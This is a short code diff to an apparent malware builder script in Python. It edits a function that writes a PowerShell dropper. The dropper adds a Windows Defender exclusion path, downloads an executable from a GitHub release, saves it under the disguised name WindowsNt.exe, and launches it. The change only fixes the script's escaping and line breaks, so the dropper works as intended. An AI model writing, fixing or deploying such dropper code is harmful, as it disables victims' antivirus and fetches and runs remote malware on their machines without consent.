@@ -37,7 +37,7 @@ def setup_webhook():
             star()
 
 def setup_powershell():
-    script = f'$path="C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Temp";Set-MpPreference -ExclusionPath $path;Invoke-WebRequest -Uri "https://github.com/{repo_url}/releases/{client}/download/{client}.exe" -OutFile "$env:TEMP\WindowsNt.exe";Start-Process "$env:TEMP\WindowsNt.exe"exit;\n'
+    script = f'$path = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Temp"\nSet-MpPreference -ExclusionPath $path\nInvoke-WebRequest -Uri "https://github.com/{repo}/releases/{client}/download/{client}.exe" -OutFile "$env:TEMP\\WindowsNt.exe"\nStart-Process "$env:TEMP\\WindowsNt.exe"\nexit;\n'
     with open(f'{client}.ps1','w') as w:
         w.write(script)
         if debug:
